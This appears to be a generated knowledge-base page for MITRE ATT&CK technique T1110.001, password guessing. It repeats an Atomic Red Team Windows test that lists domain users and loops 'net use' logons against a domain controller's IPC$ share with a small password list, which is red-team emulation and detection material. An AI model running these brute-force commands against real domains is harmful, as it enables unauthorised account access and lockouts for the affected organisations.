
# Password Guessing

## Description

### MITRE Description

> Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.

Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)

Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)

In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)

In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Linux', 'macOS', 'Windows', 'Office 365', 'GCP', 'Azure AD', 'AWS', 'Azure', 'SaaS']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1110/001

## Potential Commands

```
net user /domain > #{input_file_users}
echo "Password1" >> #{input_file_passwords}
echo "1q2w3e4r" >> #{input_file_passwords}
echo "Password!" >> #{input_file_passwords}
@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:YOUR_COMPANY\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
net user /domain > DomainUsers.txt
echo "Password1" >> #{input_file_passwords}
echo "1q2w3e4r" >> #{input_file_passwords}
echo "Password!" >> #{input_file_passwords}
@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
net user /domain > #{input_file_users}
echo "Password1" >> #{input_file_passwords}
echo "1q2w3e4r" >> #{input_file_passwords}
echo "Password!" >> #{input_file_passwords}
@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use \\COMPANYDC1\IPC$ /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\COMPANYDC1\IPC$ > NUL
net user /domain > #{input_file_users}
echo "Password1" >> passwords.txt
echo "1q2w3e4r" >> passwords.txt
echo "Password!" >> passwords.txt
@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (passwords.txt) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
```

## Commands Dataset

```
[{'command': 'net user /domain > DomainUsers.txt\n'
             'echo "Password1" >> #{input_file_passwords}\n'
             'echo "1q2w3e4r" >> #{input_file_passwords}\n'
             'echo "Password!" >> #{input_file_passwords}\n'
             '@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in '
             '(#{input_file_passwords}) DO @net use #{remote_host} '
             '/user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use '
             '/delete #{remote_host} > NUL\n',
  'name': None,
  'source': 'atomics/T1110.001/T1110.001.yaml'},
 {'command': 'net user /domain > #{input_file_users}\n'
             'echo "Password1" >> passwords.txt\n'
             'echo "1q2w3e4r" >> passwords.txt\n'
             'echo "Password!" >> passwords.txt\n'
             '@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in '
             '(passwords.txt) DO @net use #{remote_host} /user:#{domain}\\%n '
             '%p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete '
             '#{remote_host} > NUL\n',
  'name': None,
  'source': 'atomics/T1110.001/T1110.001.yaml'},
 {'command': 'net user /domain > #{input_file_users}\n'
             'echo "Password1" >> #{input_file_passwords}\n'
             'echo "1q2w3e4r" >> #{input_file_passwords}\n'
             'echo "Password!" >> #{input_file_passwords}\n'
             '@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in '
             '(#{input_file_passwords}) DO @net use \\\\COMPANYDC1\\IPC$ '
             '/user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use '
             '/delete \\\\COMPANYDC1\\IPC$ > NUL\n',
  'name': None,
  'source': 'atomics/T1110.001/T1110.001.yaml'},
 {'command': 'net user /domain > #{input_file_users}\n'
             'echo "Password1" >> #{input_file_passwords}\n'
             'echo "1q2w3e4r" >> #{input_file_passwords}\n'
             'echo "Password!" >> #{input_file_passwords}\n'
             '@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in '
             '(#{input_file_passwords}) DO @net use #{remote_host} '
             '/user:YOUR_COMPANY\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net '
             'use /delete #{remote_host} > NUL\n',
  'name': None,
  'source': 'atomics/T1110.001/T1110.001.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Brute Force: Password Guessing': {'atomic_tests': [{'auto_generated_guid': '09480053-2f98-4854-be6e-71ae5f672224',
                                                                              'description': 'Creates '
                                                                                             'username '
                                                                                             'and '
                                                                                             'password '
                                                                                             'files '
                                                                                             'then '
                                                                                             'attempts '
                                                                                             'to '
                                                                                             'brute '
                                                                                             'force '
                                                                                             'on '
                                                                                             'remote '
                                                                                             'host\n',
                                                                              'executor': {'command': 'net '
                                                                                                      'user '
                                                                                                      '/domain '
                                                                                                      '> '
                                                                                                      '#{input_file_users}\n'
                                                                                                      'echo '
                                                                                                      '"Password1" '
                                                                                                      '>> '
                                                                                                      '#{input_file_passwords}\n'
                                                                                                      'echo '
                                                                                                      '"1q2w3e4r" '
                                                                                                      '>> '
                                                                                                      '#{input_file_passwords}\n'
                                                                                                      'echo '
                                                                                                      '"Password!" '
                                                                                                      '>> '
                                                                                                      '#{input_file_passwords}\n'
                                                                                                      '@FOR '
                                                                                                      '/F '
                                                                                                      '%n '
                                                                                                      'in '
                                                                                                      '(#{input_file_users}) '
                                                                                                      'DO '
                                                                                                      '@FOR '
                                                                                                      '/F '
                                                                                                      '%p '
                                                                                                      'in '
                                                                                                      '(#{input_file_passwords}) '
                                                                                                      'DO '
                                                                                                      '@net '
                                                                                                      'use '
                                                                                                      '#{remote_host} '
                                                                                                      '/user:#{domain}\\%n '
                                                                                                      '%p '
                                                                                                      '1>NUL '
                                                                                                      '2>&1 '
                                                                                                      '&& '
                                                                                                      '@echo '
                                                                                                      '[*] '
                                                                                                      '%n:%p '
                                                                                                      '&& '
                                                                                                      '@net '
                                                                                                      'use '
                                                                                                      '/delete '
                                                                                                      '#{remote_host} '
                                                                                                      '> '
                                                                                                      'NUL\n',
                                                                                           'name': 'command_prompt'},
                                                                              'input_arguments': {'domain': {'default': 'YOUR_COMPANY',
                                                                                                             'description': 'Domain '
                                                                                                                            'name '
                                                                                                                            'of '
                                                                                                                            'the '
                                                                                                                            'target '
                                                                                                                            'system '
                                                                                                                            'we '
                                                                                                                            'will '
                                                                                                                            'brute '
                                                                                                                            'force '
                                                                                                                            'upon',
                                                                                                             'type': 'String'},
                                                                                                  'input_file_passwords': {'default': 'passwords.txt',
                                                                                                                           'description': 'Path '
                                                                                                                                          'to '
                                                                                                                                          'a '
                                                                                                                                          'file '
                                                                                                                                          'containing '
                                                                                                                                          'a '
                                                                                                                                          'list '
                                                                                                                                          'of '
                                                                                                                                          'passwords '
                                                                                                                                          'we '
                                                                                                                                          'will '
                                                                                                                                          'attempt '
                                                                                                                                          'to '
                                                                                                                                          'brute '
                                                                                                                                          'force '
                                                                                                                                          'with',
                                                                                                                           'type': 'Path'},
                                                                                                  'input_file_users': {'default': 'DomainUsers.txt',
                                                                                                                       'description': 'Path '
                                                                                                                                      'to '
                                                                                                                                      'a '
                                                                                                                                      'file '
                                                                                                                                      'containing '
                                                                                                                                      'a '
                                                                                                                                      'list '
                                                                                                                                      'of '
                                                                                                                                      'users '
                                                                                                                                      'that '
                                                                                                                                      'we '
                                                                                                                                      'will '
                                                                                                                                      'attempt '
                                                                                                                                      'to '
                                                                                                                                      'brute '
                                                                                                                                      'force',
                                                                                                                       'type': 'Path'},
                                                                                                  'remote_host': {'default': '\\\\COMPANYDC1\\IPC$',
                                                                                                                  'description': 'Hostname '
                                                                                                                                 'of '
                                                                                                                                 'the '
                                                                                                                                 'target '
                                                                                                                                 'system '
                                                                                                                                 'we '
                                                                                                                                 'will '
                                                                                                                                 'brute '
                                                                                                                                 'force '
                                                                                                                                 'upon',
                                                                                                                  'type': 'String'}},
                                                                              'name': 'Brute '
                                                                                      'Force '
                                                                                      'Credentials',
                                                                              'supported_platforms': ['windows']}],
                                                            'attack_technique': 'T1110.001',
                                                            'display_name': 'Brute '
                                                                            'Force: '
                                                                            'Password '
                                                                            'Guessing'}}]
```

# Tactics


* [Credential Access](../tactics/Credential-Access.md)


# Mitigations


* [Account Use Policies](../mitigations/Account-Use-Policies.md)

* [Multi-factor Authentication](../mitigations/Multi-factor-Authentication.md)
    
* [Password Policies](../mitigations/Password-Policies.md)
    

# Actors

None
